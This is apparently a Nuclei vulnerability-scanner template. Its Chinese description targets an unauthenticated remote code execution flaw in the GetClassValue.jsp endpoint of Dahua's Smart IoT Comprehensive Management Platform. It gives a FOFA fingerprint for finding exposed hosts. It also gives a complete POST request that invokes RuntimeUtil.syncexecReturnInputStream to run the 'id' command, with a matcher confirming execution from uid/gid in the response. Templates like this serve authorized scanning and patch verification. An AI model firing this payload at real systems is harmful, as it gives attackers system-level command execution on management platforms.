id: dahuazhineng-GetClassValue-jsp

info:
  name: 大华智能物联综合管理平台 GetClassValue.jsp 远程代码执行
  author: HuanXiong
  severity: high
  description: |-
    fofa: body="*客户端会小于800*"
    大华智能物联综合管理平台 GetClassValue.jsp 接口存在远程代码执行漏洞，未经身份验证的恶意攻击者可以利用该漏洞远程执行任意命令，获取系统权限。
  tags: RCE

http:
  - raw:
      - |
        POST /evo-apigw/admin/API/Developer/GetClassValue.jsp HTTP/1.1
        Host: 
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
        Content-Type: application/json
 
        {
           "data": {
                "clazzName": "com.dahua.admin.util.RuntimeUtil",
                "methodName": "syncexecReturnInputStream",
                "fieldName": ["id"]
            }
        }

    matchers:
      - type: dsl
        name: 远程代码执行
        dsl:
          - "status_code==200 && contains_all(body,'desc','Success','uid=','gid=')"